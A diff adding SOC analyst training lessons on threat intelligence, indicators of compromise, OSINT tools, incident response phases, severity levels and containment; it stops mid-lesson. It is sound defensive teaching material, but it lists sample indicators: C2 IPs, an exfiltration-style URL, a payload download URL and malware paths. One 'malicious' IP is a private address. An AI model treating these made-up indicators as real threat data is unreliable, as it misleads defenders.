@@ -4169,6 +4169,4359 @@ Before escalating:
         "Identify any missing information for the handoff"
       ]
     }
+  },
+
+  // =========================================
+  // MODULE 6: THREAT INTELLIGENCE BASICS
+  // =========================================
+  {
+    id: "6.1",
+    courseId: "soc-fundamentals",
+    title: "Introduction to Threat Intelligence",
+    content: `
+# Introduction to Threat Intelligence
+
+**Threat Intelligence (TI)** is evidence-based knowledge about threats that helps organizations make informed security decisions. For SOC analysts, threat intelligence transforms raw data into actionable insights.
+
+## What is Threat Intelligence?
+
+Threat intelligence goes beyond simple data collection. It involves:
+
+- **Collection** - Gathering data from various sources
+- **Processing** - Normalizing and structuring the data
+- **Analysis** - Finding patterns and meaning
+- **Dissemination** - Sharing insights with stakeholders
+
+> "Data becomes information, information becomes intelligence, and intelligence drives action."
+
+## Types of Threat Intelligence
+
+### 1. Strategic Intelligence
+- High-level trends and patterns
+- Business risk assessments
+- Consumed by executives and management
+- Example: "Ransomware attacks increased 150% in healthcare"
+
+### 2. Tactical Intelligence
+- TTPs (Tactics, Techniques, Procedures)
+- How adversaries operate
+- Consumed by security architects and defenders
+- Example: "APT29 uses spear-phishing with COVID-themed lures"
+
+### 3. Operational Intelligence
+- Details about specific attacks
+- Campaign information and timelines
+- Consumed by IR teams and threat hunters
+- Example: "Upcoming DDoS attack planned for Black Friday"
+
+### 4. Technical Intelligence
+- Specific indicators of compromise (IOCs)
+- Machine-readable data
+- Consumed by SOC analysts and automated tools
+- Example: "Malicious IP: 192.168.1.100, Hash: abc123..."
+
+| Intelligence Type | Consumer | Refresh Rate | Format |
+|-------------------|----------|--------------|--------|
+| Strategic | Executives | Monthly/Quarterly | Reports |
+| Tactical | Security Teams | Weekly | TTPs, Playbooks |
+| Operational | IR/Hunters | Daily | Advisories |
+| Technical | SOC/Tools | Real-time | IOCs, Feeds |
+
+## How SOC Analysts Use Threat Intelligence
+
+### During Alert Triage
+1. Check if source/destination IPs are known malicious
+2. Compare file hashes against threat intel databases
+3. Look for known C2 domains in network traffic
+4. Match behavior patterns to known TTPs
+
+### For Enrichment
+\`\`\`
+Alert: Suspicious PowerShell execution
+     ↓
+Threat Intel Enrichment:
+- Command pattern matches APT28 technique
+- Similar commands seen in recent campaign
+- Associated with ransomware delivery
+     ↓
+Elevated Priority: High
+\`\`\`
+
+### Proactive Defense
+- Block known malicious indicators
+- Hunt for IOCs in your environment
+- Update detection rules based on new TTPs
+
+## The Intelligence Lifecycle
+
+\`\`\`
+     ┌─────────────────────────────────────────────────────┐
+     │                                                     │
+     ↓                                                     │
+┌─────────┐    ┌──────────┐    ┌─────────┐    ┌──────────┐│
+│Direction│ → │Collection│ → │Processing│ → │ Analysis ││
+└─────────┘    └──────────┘    └─────────┘    └──────────┘│
+                                                   │      │
+                                                   ↓      │
+                                            ┌───────────┐ │
+                                            │Disseminate│─┘
+                                            └───────────┘
+                                                   │
+                                                   ↓
+                                             ┌─────────┐
+                                             │Feedback │
+                                             └─────────┘
+\`\`\`
+
+## Building Your TI Mindset
+
+As a SOC analyst, develop these habits:
+
+1. **Question everything** - Don't blindly trust intel feeds
+2. **Verify sources** - Check credibility and freshness
+3. **Context matters** - Intel must be relevant to your environment
+4. **Share back** - Contribute to the community
+5. **Stay current** - Threats evolve rapidly
+    `,
+    keyTakeaways: [
+      "Threat intelligence transforms data into actionable security insights",
+      "Four types: Strategic, Tactical, Operational, and Technical",
+      "SOC analysts primarily use technical intelligence (IOCs) for enrichment",
+      "The intelligence lifecycle ensures continuous improvement",
+      "Always verify sources and consider relevance to your environment"
+    ],
+    additionalResources: [
+      { title: "MITRE ATT&CK Framework", type: "documentation", url: "https://attack.mitre.org" },
+      { title: "Threat Intelligence 101", type: "article", url: "https://www.sans.org" }
+    ]
+  },
+  {
+    id: "6.2",
+    courseId: "soc-fundamentals",
+    title: "IOC Types & Usage",
+    content: `
+# Indicators of Compromise (IOCs)
+
+**Indicators of Compromise** are forensic artifacts that identify potentially malicious activity. They're the "fingerprints" that attackers leave behind.
+
+## Common IOC Types
+
+### 1. File-Based Indicators
+
+**Hash Values**
+- **MD5** - 32 characters (legacy, collision-prone)
+- **SHA1** - 40 characters (being phased out)
+- **SHA256** - 64 characters (current standard)
+
+\`\`\`
+Example SHA256:
+e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+\`\`\`
+
+**File Metadata**
+- File names (e.g., "invoice.pdf.exe")
+- File sizes
+- Compilation timestamps
+- Digital signature status
+
+### 2. Network Indicators
+
+**IP Addresses**
+\`\`\`
+- C2 Server: 185.234.218.45
+- Malware Distribution: 91.109.190.68
+- Spam Source: 45.89.127.34
+\`\`\`
+
+**Domain Names**
+- C2 domains: evil-domain.xyz
+- DGA patterns: aj3k2hf9.com
+- Typosquatting: micr0soft.com
+
+**URLs**
+\`\`\`
+http://malicious.site/download/payload.exe
+https://legit-looking.com/api/exfil?data=base64...
+\`\`\`
+
+### 3. Host-Based Indicators
+
+**Registry Keys**
+\`\`\`
+HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\MalwareName
+HKCU\\Software\\MaliciousApp\\Config
+\`\`\`
+
+**File Paths**
+\`\`\`
+C:\\Users\\Public\\malware.exe
+C:\\Windows\\Temp\\suspicious.dll
+%APPDATA%\\Roaming\\backdoor.exe
+\`\`\`
+
+**Mutex Names**
+- Used by malware to prevent multiple instances
+- Often unique to malware families
+
+### 4. Behavioral Indicators
+
+| Behavior | Detection Method |
+|----------|------------------|
+| Unusual process spawning | Process monitoring |
+| Registry persistence | Registry auditing |
+| Network beaconing | Traffic analysis |
+| Credential access | Authentication logs |
+
+## The Pyramid of Pain
+
+David Bianco's Pyramid of Pain illustrates how difficult it is for attackers to change different IOC types:
+
+\`\`\`
+                    △
+                   /│\\
+                  / │ \\  TTPs (Hardest to change)
+                 /  │  \\
+                /───┼───\\
+               /    │    \\  Tools
+              /     │     \\
+             /──────┼──────\\
+            /       │       \\  Network/Host Artifacts
+           /        │        \\
+          /─────────┼─────────\\
+         /          │          \\  Domain Names
+        /           │           \\
+       /────────────┼────────────\\
+      /             │             \\  IP Addresses
+     /              │              \\
+    /───────────────┼───────────────\\
+   /                │                \\  Hash Values (Easiest to change)
+  ▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔
+\`\`\`
+
+## Using IOCs in the SOC
+
+### Practical Workflow
+1. **Receive IOC** - From threat feed or intel report
+2. **Validate** - Check source reliability and freshness
+3. **Search** - Query SIEM/EDR for matches
+4. **Contextualize** - Understand what a match means
+5. **Act** - Block, alert, or investigate further
+
+### IOC Matching Example
+\`\`\`
+SIEM Query:
+index=network sourcetype=firewall dest_ip IN (
+  "185.234.218.45",
+  "91.109.190.68",
+  "45.89.127.34"
+)
+
+Results: 3 connections from HOST-PC-42 to 185.234.218.45
+         First seen: 2024-01-15 03:22:45 UTC
+         Last seen: 2024-01-15 03:45:12 UTC
+\`\`\`
+
+## IOC Quality Considerations
+
+**Good IOCs:**
+- Recent and timely
+- Contextual information provided
+- Verified by multiple sources
+- Low false positive rate
+
+**Poor IOCs:**
+- Stale or outdated
+- No context or attribution
+- Single unverified source
+- High false positive rate (common IPs, generic hashes)
+    `,
+    keyTakeaways: [
+      "IOCs are forensic artifacts indicating potential malicious activity",
+      "Main types: hashes, IPs, domains, URLs, and behavioral patterns",
+      "The Pyramid of Pain shows that TTPs are hardest for attackers to change",
+      "Always validate IOC quality and freshness before acting",
+      "Context is crucial - an IOC without context has limited value"
+    ],
+    practicalExercise: {
+      title: "IOC Research Challenge",
+      description: "Practice researching and validating indicators of compromise.",
+      steps: [
+        "Take a provided suspicious hash value",
+        "Research it on VirusTotal and other platforms",
+        "Document what malware family it belongs to",
+        "Find related IOCs (C2 IPs, domains, additional hashes)",
+        "Assess the IOC's quality and relevance"
+      ]
+    }
+  },
+  {
+    id: "6.3",
+    courseId: "soc-fundamentals",
+    title: "OSINT for SOC Analysts",
+    content: `
+# OSINT for SOC Analysts
+
+**Open Source Intelligence (OSINT)** refers to intelligence collected from publicly available sources. For SOC analysts, OSINT is a powerful tool for enriching alerts and investigating threats.
+
+## What is OSINT?
+
+OSINT includes any publicly accessible information:
+
+- Public websites and databases
+- Social media platforms
+- Government publications
+- News and media reports
+- Technical repositories (GitHub, etc.)
+- DNS and WHOIS records
+- Certificate transparency logs
+
+## Essential OSINT Techniques for SOC
+
+### 1. IP Address Research
+
+**Key Information to Gather:**
+- Geographic location
+- ASN and ISP
+- Reputation scores
+- Historical activity
+- Associated domains
+
+**Example Workflow:**
+\`\`\`
+Suspicious IP: 185.234.218.45
+
+Step 1: GeoIP Lookup → Russia, Moscow
+Step 2: ASN Lookup → AS12345 - Suspicious Hosting Provider
+Step 3: Reputation Check → Listed on 5 blocklists
+Step 4: VirusTotal → 12/90 engines flag as malicious
+Step 5: Shodan → Running nginx, multiple open ports
+
+Conclusion: High-risk IP, likely malicious infrastructure
+\`\`\`
+
+### 2. Domain Investigation
+
+**DNS Analysis:**
+\`\`\`bash
+# WHOIS lookup
+whois suspicious-domain.com
+
+# DNS records
+dig suspicious-domain.com ANY
+
+# Historical DNS
+# Use SecurityTrails, PassiveTotal, etc.
+\`\`\`
+
+**Red Flags in Domains:**
+- Recently registered (< 30 days)
+- Privacy-protected WHOIS
+- Cheap TLDs (.xyz, .top, .info)
+- Similar to known brands (typosquatting)
+- Random character strings (DGA)
+
+### 3. File and Hash Analysis
+
+**VirusTotal Workflow:**
+1. Submit hash (don't upload sensitive files!)
+2. Review detection ratio
+3. Check behavior analysis
+4. Look at relations (IPs, domains, other files)
+5. Read community comments
+
+### 4. Email Header Analysis
+
+\`\`\`
+From: CEO <ceo@company.com>
+Received: from suspicious-smtp.evil.com (91.109.190.68)
+
+Analysis:
+- Display name doesn't match sender domain
+- Originating IP is from suspicious provider
+- SPF/DKIM likely failing
+\`\`\`
+
+## Free OSINT Tools for SOC Analysts
+
+| Tool | Purpose | URL |
+|------|---------|-----|
+| VirusTotal | File/URL/IP analysis | virustotal.com |
+| AbuseIPDB | IP reputation | abuseipdb.com |
+| Shodan | Internet-connected devices | shodan.io |
+| urlscan.io | URL analysis | urlscan.io |
+| MXToolbox | Email/DNS tools | mxtoolbox.com |
+| Have I Been Pwned | Breach lookup | haveibeenpwned.com |
+| GreyNoise | Mass scanning intel | greynoise.io |
+| Pulsedive | Threat intelligence | pulsedive.com |
+| ThreatFox | IOC database | threatfox.abuse.ch |
+| Malware Bazaar | Malware samples | bazaar.abuse.ch |
+
+## OSINT Investigation Mindset
+
+### The Analysis Process
+
+\`\`\`
+    Start with Known IOC
+            │
+            ↓
+    ┌───────────────┐
+    │  Pivot Point  │ ←─── What do we know?
+    └───────┬───────┘
+            │
+     ┌──────┼──────┐
+     ↓      ↓      ↓
+   IPs  Domains  Hashes ←── Related indicators
+     │      │      │
+     └──────┼──────┘
+            ↓
+    ┌───────────────┐
+    │  Connections  │ ←─── How are they related?
+    └───────┬───────┘
+            ↓
+    Build the Picture
+\`\`\`
+
+### Best Practices
+
+1. **Document everything** - Keep notes of your research path
+2. **Verify claims** - Don't trust single sources
+3. **Consider context** - Is this relevant to YOUR environment?
+4. **Maintain OPSEC** - Don't tip off attackers
+5. **Time-box research** - Set limits to avoid rabbit holes
+    `,
+    keyTakeaways: [
+      "OSINT provides valuable context from publicly available sources",
+      "Key techniques include IP research, domain analysis, and hash investigation",
+      "Free tools like VirusTotal and AbuseIPDB are essential for SOC work",
+      "Always document your research and verify information from multiple sources",
+      "Pivot from known indicators to discover related infrastructure"
+    ],
+    additionalResources: [
+      { title: "VirusTotal", type: "tool", url: "https://www.virustotal.com" },
+      { title: "AbuseIPDB", type: "tool", url: "https://www.abuseipdb.com" },
+      { title: "Shodan", type: "tool", url: "https://www.shodan.io" }
+    ]
+  },
+  {
+    id: "6.4",
+    courseId: "soc-fundamentals",
+    title: "Threat Intel Platforms",
+    content: `
+# Threat Intelligence Platforms
+
+**Threat Intelligence Platforms (TIPs)** aggregate, correlate, and operationalize threat data from multiple sources. Understanding these platforms is essential for modern SOC operations.
+
+## What is a TIP?
+
+A TIP helps organizations:
+
+- **Aggregate** - Collect intel from multiple feeds
+- **Normalize** - Standardize different formats
+- **Enrich** - Add context to indicators
+- **Analyze** - Find patterns and connections
+- **Disseminate** - Share with security tools
+- **Collaborate** - Enable team workflows
+
+## Essential Platforms for SOC Analysts
+
+### VirusTotal
+
+The Swiss Army knife of threat analysis.
+
+**Key Features:**
+- File, URL, IP, and domain scanning
+- 70+ antivirus engines
+- Behavioral analysis (sandboxing)
+- Graph relationships between IOCs
+- Community contributions
+
+**Pro Tips:**
+\`\`\`
+1. Use VT Graph to visualize connections
+2. Check the "Relations" tab for pivoting
+3. Review "Community" for analyst insights
+4. Use search modifiers:
+   - content:"powershell"
+   - type:peexe positives:5+
+   - engines:kaspersky
+\`\`\`
+
+### AlienVault OTX (Open Threat Exchange)
+
+**Features:**
+- Free community-driven platform
+- Pulses (threat reports with IOCs)
+- Integration with security tools
+- API access for automation
+
+**Using OTX:**
+1. Search for IOCs in your alerts
+2. Find related pulses and campaigns
+3. Subscribe to relevant pulse feeds
+4. Export IOCs to your SIEM
+
+### MISP (Malware Information Sharing Platform)
+
+Open-source threat intelligence platform.
+
+**Capabilities:**
+- IOC management and sharing
+- Event correlation
+- Integration with SIEMs and ticketing
+- Community sharing groups
+
+### Commercial TIP Options
+
+| Platform | Strengths |
+|----------|-----------|
+| Recorded Future | NLP-powered intel analysis |
+| ThreatConnect | Workflow automation |
+| Anomali | Feed aggregation |
+| Mandiant Advantage | Incident intel |
+
+## Free Resources Every SOC Analyst Should Know
+
+### Abuse.ch Projects
+
+\`\`\`
+URLhaus     → Malicious URLs
+ThreatFox   → IOC database  
+Malware Bazaar → Malware samples
+SSL Blacklist  → Malicious SSL certs
+Feodo Tracker  → Botnet C2 servers
+\`\`\`
+
+### Other Valuable Resources
+
+**Reputation Services:**
+- GreyNoise - Identifies mass scanners
+- Pulsedive - Free IOC enrichment
+- IPQualityScore - Fraud detection
+
+**Sandbox Services:**
+- Any.run - Interactive malware analysis
+- Hybrid Analysis - Automated sandboxing
+- Joe Sandbox - Deep analysis
+
+**Search Engines:**
+- Shodan - Internet device search
+- Censys - Internet-wide scanning
+- BinaryEdge - Attack surface discovery
+
+## Integrating TI Into Your Workflow
+
+### Automated Enrichment
+
+\`\`\`
+Alert Triggered
+      │
+      ↓
+┌─────────────────────────────────────────────┐
+│           Automated Enrichment              │
+├─────────────────────────────────────────────┤
+│  • Query VirusTotal for hashes              │
+│  • Check AbuseIPDB for IP reputation        │
+│  • Lookup domain age and WHOIS              │
+│  • Search OTX for related pulses            │
+│  • Check GreyNoise for scanner status       │
+└─────────────────────────────────────────────┘
+      │
+      ↓
+Enriched Alert to Analyst
+\`\`\`
+
+### Building Your Personal Toolkit
+
+1. **Create accounts** on key platforms (free tiers)
+2. **Bookmark** frequently used tools
+3. **Learn API basics** for automation
+4. **Build browser workflows** for quick lookups
+5. **Document** your research processes
+    `,
+    keyTakeaways: [
+      "TIPs aggregate and operationalize threat data from multiple sources",
+      "VirusTotal is essential for file, URL, IP, and domain analysis",
+      "Free resources like OTX, ThreatFox, and abuse.ch are valuable",
+      "Integrate threat intel into your workflow for automated enrichment",
+      "Build your personal toolkit of bookmarked platforms and workflows"
+    ],
+    practicalExercise: {
+      title: "Platform Exploration",
+      description: "Familiarize yourself with key threat intelligence platforms.",
+      steps: [
+        "Create a free VirusTotal account and explore the interface",
+        "Sign up for AlienVault OTX and browse popular pulses",
+        "Research a recent malware sample on ThreatFox",
+        "Use Shodan to search for exposed services",
+        "Document 5 tools you'll add to your daily workflow"
+      ]
+    }
+  },
+
+  // =========================================
+  // MODULE 7: INCIDENT RESPONSE INTRODUCTION
+  // =========================================
+  {
+    id: "7.1",
+    courseId: "soc-fundamentals",
+    title: "Incident Response Lifecycle",
+    content: `
+# The Incident Response Lifecycle
+
+**Incident Response (IR)** is the organized approach to addressing and managing security breaches. Understanding the IR lifecycle is fundamental for every SOC analyst.
+
+## What is an Incident?
+
+A **security incident** is an event that:
+- Violates security policies
+- Threatens the confidentiality, integrity, or availability of systems
+- May require a coordinated response
+
+**Examples:**
+- Malware infection on a workstation
+- Successful phishing attack
+- Data exfiltration detected
+- Ransomware encryption
+- Unauthorized access to sensitive data
+
+## The NIST Incident Response Framework
+
+The NIST framework defines four primary phases:
+
+\`\`\`
+┌─────────────────────────────────────────────────────────────────┐
+│                    INCIDENT RESPONSE LIFECYCLE                   │
+├──────────────┬──────────────┬──────────────┬───────────────────┤
+│              │              │              │                   │
+│  Preparation │  Detection & │ Containment, │ Post-Incident     │
+│              │  Analysis    │ Eradication, │ Activity          │
+│              │              │ & Recovery   │                   │
+│              │              │              │                   │
+└──────────────┴──────────────┴──────────────┴───────────────────┘
+       │              ↓              ↓                │
+       │         INCIDENT        INCIDENT            │
+       │         DETECTED        HANDLED             │
+       └──────────────────────────────────────────────┘
+                      CONTINUOUS IMPROVEMENT
+\`\`\`
+
+### Phase 1: Preparation
+
+**Goal:** Build capability to respond effectively
+
+**Activities:**
+- Develop incident response plan
+- Build and train the IR team
+- Deploy detection and monitoring tools
+- Create communication plans
+- Conduct tabletop exercises
+
+**SOC Analyst Role:**
+- Know your tools and procedures
+- Understand escalation paths
+- Practice with simulated scenarios
+
+### Phase 2: Detection & Analysis
+
+**Goal:** Identify and understand the incident
+
+**Activities:**
+- Monitor alerts and reports
+- Correlate events across sources
+- Determine scope and impact
+- Document initial findings
+- Classify the incident
+
+**Key Questions:**
+\`\`\`
+□ What happened?
+□ When did it start?
+□ What systems are affected?
+□ What data is at risk?
+□ How did the attacker get in?
+□ Is the attack ongoing?
+\`\`\`
+
+### Phase 3: Containment, Eradication, & Recovery
+
+**Containment Strategies:**
+
+| Strategy | Description | Example |
+|----------|-------------|---------|
+| Short-term | Immediate action to stop spread | Isolate infected host |
+| Long-term | Temporary fix while preparing cleanup | Block malicious IP at firewall |
+
+**Eradication:**
+- Remove malware and artifacts
+- Patch vulnerabilities
+- Reset compromised credentials
+- Clean or reimage systems
+
+**Recovery:**
+- Restore from clean backups
+- Validate system integrity
+- Return to normal operations
+- Monitor for reinfection
+
+### Phase 4: Post-Incident Activity
+
+**Goal:** Learn and improve
+
+**Activities:**
+- Conduct lessons learned meeting
+- Update detection rules
+- Improve procedures
+- Document the incident fully
+- Share intelligence (as appropriate)
+
+**Lessons Learned Questions:**
+1. What happened and when?
+2. How well did we perform?
+3. What could we do better?
+4. What improvements are needed?
+5. How do we prevent recurrence?
+
+## IR Playbooks
+
+Playbooks standardize response to common incident types:
+
+\`\`\`
+PHISHING PLAYBOOK
+
+1. IDENTIFY
+   □ Analyze reported email
+   □ Extract IOCs (sender, links, attachments)
+   □ Check if clicked/opened
+
+2. CONTAIN
+   □ Block sender/domain
+   □ Remove email from mailboxes
+   □ If clicked: isolate endpoint
+
+3. ERADICATE
+   □ Scan affected endpoints
+   □ Remove any downloaded payloads
+   □ Reset credentials if needed
+
+4. RECOVER
+   □ Clear user to resume work
+   □ Confirm no persistence
+
+5. LESSONS LEARNED
+   □ Update email filters
+   □ Conduct user awareness
+   □ Document in incident log
+\`\`\`
+
+## SOC Analyst's IR Responsibilities
+
+As an L1 analyst, you primarily handle:
+- **Detection** - Identifying potential incidents
+- **Initial Analysis** - First-level triage
+- **Documentation** - Recording findings
+- **Escalation** - Passing to IR team when needed
+- **Support** - Assisting during active response
+    `,
+    keyTakeaways: [
+      "The NIST IR lifecycle has four phases: Preparation, Detection & Analysis, Containment/Eradication/Recovery, and Post-Incident",
+      "Preparation before incidents occur is crucial for effective response",
+      "Containment prevents spread while you work on eradication",
+      "Post-incident lessons learned drive continuous improvement",
+      "Playbooks standardize response to common incident types"
+    ],
+    additionalResources: [
+      { title: "NIST SP 800-61", type: "documentation", url: "https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf" },
+      { title: "SANS Incident Handler's Handbook", type: "article", url: "https://www.sans.org" }
+    ]
+  },
+  {
+    id: "7.2",
+    courseId: "soc-fundamentals",
+    title: "Incident Classification & Severity",
+    content: `
+# Incident Classification & Severity
+
+Properly classifying incidents ensures appropriate resource allocation and response speed. Not every security event deserves the same level of attention.
+
+## Incident vs. Event vs. Alert
+
+Understanding the hierarchy:
+
+\`\`\`
+     Events (Millions daily)
+           │
+           ↓ [Detection Rules]
+           │
+        Alerts (Thousands daily)
+           │
+           ↓ [Analyst Triage]
+           │
+       Incidents (Few per day/week)
+\`\`\`
+
+**Event:** Any observable occurrence
+**Alert:** Event that triggers a detection rule
+**Incident:** Validated security breach requiring response
+
+## Incident Classification Categories
+
+### By Attack Vector
+
+| Category | Description | Examples |
+|----------|-------------|----------|
+| Malware | Malicious software infection | Ransomware, trojan, worm |
+| Phishing | Deceptive communications | Email phishing, vishing |
+| Unauthorized Access | Illegitimate system access | Brute force, credential stuffing |
+| Data Breach | Unauthorized data exposure | Exfiltration, data leak |
+| DoS/DDoS | Availability attacks | Service disruption |
+| Insider Threat | Malicious employee activity | Data theft, sabotage |
+| Web Attack | Application-layer attacks | SQLi, XSS, RCE |
+
+### By Impact Type
+
+- **Confidentiality** - Data exposure or theft
+- **Integrity** - Data modification or corruption
+- **Availability** - Service or system disruption
+
+## Severity Levels
+
+Most organizations use 4-5 severity levels:
+
+### Severity Level Framework
+
+\`\`\`
+┌──────────────────────────────────────────────────────────────┐
+│ SEVERITY 1 - CRITICAL                                        │
+├──────────────────────────────────────────────────────────────┤
+│ • Active ransomware encryption                               │
+│ • Confirmed data breach of PII/PHI                           │
+│ • Production systems completely down                         │
+│ • Nation-state attack confirmed                              │
+│                                                              │
+│ Response: Immediate, all-hands, executive notification       │
+│ SLA: 15 minutes initial response                             │
+└──────────────────────────────────────────────────────────────┘
+
+┌──────────────────────────────────────────────────────────────┐
+│ SEVERITY 2 - HIGH                                            │
+├──────────────────────────────────────────────────────────────┤
+│ • Active malware on multiple endpoints                       │
+│ • Compromised admin credentials                              │
+│ • Successful phishing with credential theft                  │
+│ • C2 communication detected                                  │
+│                                                              │
+│ Response: Urgent, IR team engaged                            │
+│ SLA: 1 hour initial response                                 │
+└──────────────────────────────────────────────────────────────┘
+
+┌──────────────────────────────────────────────────────────────┐
+│ SEVERITY 3 - MEDIUM                                          │
+├──────────────────────────────────────────────────────────────┤
+│ • Malware contained on single endpoint                       │
+│ • Phishing email clicked, no credential entry                │
+│ • Policy violations detected                                 │
+│ • Suspicious but unconfirmed activity                        │
+│                                                              │
+│ Response: Same-day investigation                             │
+│ SLA: 4 hours initial response                                │
+└──────────────────────────────────────────────────────────────┘
+
+┌──────────────────────────────────────────────────────────────┐
+│ SEVERITY 4 - LOW                                             │
+├──────────────────────────────────────────────────────────────┤
+│ • Blocked malware attempt                                    │
+│ • Reported phishing (not clicked)                            │
+│ • Minor policy violation                                     │
+│ • False positive after investigation                         │
+│                                                              │
+│ Response: Next business day                                  │
+│ SLA: 24 hours initial response                               │
+└──────────────────────────────────────────────────────────────┘
+\`\`\`
+
+## Factors Affecting Severity
+
+### Asset Criticality
+
+\`\`\`
+Question: What system is affected?
+
+├── Domain Controller     → Increase severity
+├── Database server       → Increase severity
+├── Executive workstation → Increase severity
+├── Standard workstation  → Normal severity
+└── Test/Dev server       → Decrease severity
+\`\`\`
+
+### Data Sensitivity
+
+\`\`\`
+Question: What data is at risk?
+
+├── PII/PHI/PCI data     → Increase severity
+├── Trade secrets        → Increase severity
+├── Financial data       → Increase severity
+├── Internal documents   → Normal severity
+└── Public information   → Decrease severity
+\`\`\`
+
+### Scope and Spread
+
+\`\`\`
+Question: How widespread?
+
+├── Multiple departments → Increase severity
+├── Multiple systems     → Increase severity
+├── Single system        → Normal severity
+└── Contained quickly    → Decrease severity
+\`\`\`
+
+## Classification Decision Tree
+
+\`\`\`
+                    Security Event Detected
+                            │
+                            ↓
+              ┌─────────────────────────┐
+              │ Is this a real threat? │
+              └───────────┬─────────────┘
+                    │           │
+                   Yes          No → Document & Close
+                    │
+                    ↓
+              ┌─────────────────────────┐
+              │ What category of attack?│
+              └───────────┬─────────────┘
+                          │
+                          ↓
+              ┌─────────────────────────┐
+              │ What assets affected?   │
+              └───────────┬─────────────┘
+                          │
+                          ↓
+              ┌─────────────────────────┐
+              │ What is the impact?     │
+              └───────────┬─────────────┘
+                          │
+                          ↓
+                  Assign Severity
+                          │
+                          ↓
+                Follow Response SLA
+\`\`\`
+    `,
+    keyTakeaways: [
+      "Distinguish between events, alerts, and confirmed incidents",
+      "Classify incidents by attack type and impact (CIA triad)",
+      "Severity levels determine response urgency and resource allocation",
+      "Asset criticality and data sensitivity affect severity assignment",
+      "Use a consistent decision tree for objective classification"
+    ],
+    practicalExercise: {
+      title: "Incident Classification Exercise",
+      description: "Practice classifying sample incidents by type and severity.",
+      steps: [
+        "Review 5 sample incident scenarios",
+        "Classify each by attack category",
+        "Assign severity level (1-4)",
+        "Document your reasoning for each classification",
+        "Compare with the provided answer key"
+      ]
+    }
+  },
+  {
+    id: "7.3",
+    courseId: "soc-fundamentals",
+    title: "Initial Containment Actions",
+    content: `
+# Initial Containment Actions
+
+**Containment** is the critical phase where you stop the bleeding. Quick, decisive containment can mean the difference between a minor incident and a major breach.
+
+## Containment Philosophy
+
+> "Contain first, investigate second - but don't destroy evidence"
+
+**Key Principles:**
+1. Stop the spread of the attack
+2. Preserve evidence for investigation
+3. Minimize business disruption
+4. Document all actions taken
+
+## Common Containment Strategies
+
+### Network Isolation
+
+**Full Network Isolation:**
+\`\`\`
+Action: Disconnect host from network
+When: Active ransomware, confirmed C2, lateral movement
+
+Methods:
+• Disable switch port
+• Block at firewall
+• EDR network isolation feature
+• Disable network adapter (if physical access)
+\`\`\`
+
+**Selective Blocking:**
+\`\`\`
+Action: Block specific traffic
+When: Known malicious IPs/domains, C2 beaconing
+
+Methods:
+• Firewall rules
+• DNS sinkhole
+• Proxy blocks
+• WAF rules
+\`\`\`
+
+### Account Actions
+
+\`\`\`
+COMPROMISED ACCOUNT CONTAINMENT
+
+1. Disable the account
+   └─ AD: Disable in Users & Computers
+   └─ Cloud: Suspend in admin console
+
+2. Terminate active sessions
+   └─ Force logout from all devices
+   └─ Revoke OAuth tokens
+
+3. Reset credentials
+   └─ Password reset (force at next login)
+   └─ Revoke/regenerate API keys
+
+4. Review recent activity
+   └─ Check login history
+   └─ Review permission changes
+\`\`\`
+
+### Endpoint Containment
+
+**EDR Containment:**
+\`\`\`
+Most EDR tools offer:
+• Network isolation (blocks all except EDR traffic)
+• Process termination
+• File quarantine
+• Remediation actions
+\`\`\`
+
+**Manual Containment:**
+\`\`\`
+If no EDR available:
+• Power off (last resort - loses volatile data)
+• Unplug network cable
+• Login and disable network adapter
+• Move to quarantine VLAN
+\`\`\`
+
+## Containment by Incident Type
+
+### Malware Infection
+
+\`\`\`
+IMMEDIATE ACTIONS:
+□ Isolate affected host(s) from network
+□ Identify malware family if possible
+□ Check for lateral movement indicators
+□ Block C2 communications at firewall
+□ Preserve memory for analysis (if possible)
+
+DON'T:
+✗ Immediately reboot/wipe (destroys evidence)
+✗ Run antivirus before collecting artifacts
+✗ Alert the attacker you've detected them
+\`\`\`
+
+### Phishing with Credential Compromise
+
+\`\`\`
+IMMEDIATE ACTIONS:
+□ Reset user's password
+□ Terminate all active sessions
+□ Review account activity since compromise
+□ Check for mail forwarding rules
+□ Alert user and manager
+□ Block sender domain/IP
+
+ADDITIONAL STEPS:
+□ Search for similar emails to other users
+□ Check if MFA was bypassed
+□ Review VPN/remote access logs
+\`\`\`
+
+### Ransomware
+
+\`\`\`
+CRITICAL - EVERY SECOND COUNTS!
+
+□ IMMEDIATELY isolate affected systems
+□ DO NOT power off (may trigger encryption)
+□ Identify patient zero if possible
+□ Block lateral movement paths
+□ Disable network shares
+□ Contact IR team/management ASAP
+
+PRESERVE:
+□ Ransom notes (file and screenshot)
+□ Encrypted file samples
+□ Running processes and memory
+□ Network connections at time of detection
+\`\`\`
+
+### Unauthorized Access
+
+\`\`\`
+IMMEDIATE ACTIONS:
+□ Lock out the suspicious account
+□ Terminate active connections
+□ Block source IP address
+□ Review what was accessed
+□ Check for new accounts created
+□ Look for persistence mechanisms
+\`\`\`
+
+## Containment Decision Matrix
+
+| Factor | Aggressive Containment | Conservative Containment |
+|--------|------------------------|--------------------------|
+| Impact | High/Critical severity | Low/Medium severity |
+| Spread | Active lateral movement | Isolated to one system |
+| Data | Sensitive data at risk | No sensitive data |
+| Business | Non-critical system | Business-critical system |
+| Evidence | Evidence preserved | More evidence needed |
+
+## Documentation During Containment
+
+**Record Everything:**
+\`\`\`
+Containment Log Template:
+
+Timestamp: [YYYY-MM-DD HH:MM:SS UTC]
+Action: [What you did]
+Target: [System/Account affected]
+Method: [How you did it]
+Reason: [Why this action]
+Result: [Outcome observed]
+Analyst: [Your name]
+
+Example:
+Timestamp: 2024-01-15 14:32:15 UTC
+Action: Network isolation via EDR
+Target: WORKSTATION-042 (10.0.1.42)
+Method: CrowdStrike network contain
+Reason: Confirmed Cobalt Strike beacon
+Result: Beaconing stopped, host isolated
+Analyst: J. Smith
+\`\`\`
+    `,
+    keyTakeaways: [
+      "Containment stops the attack spread while preserving evidence",
+      "Network isolation is often the fastest containment method",
+      "Account compromise requires password reset and session termination",
+      "Ransomware demands immediate isolation - every second counts",
+      "Document every containment action with timestamps"
+    ],
+    practicalExercise: {
+      title: "Containment Scenario Practice",
+      description: "Work through containment decisions for different incident types.",
+      steps: [
+        "Review the phishing scenario and list containment steps",
+        "Review the ransomware scenario and prioritize actions",
+        "For each scenario, document what you would NOT do and why",
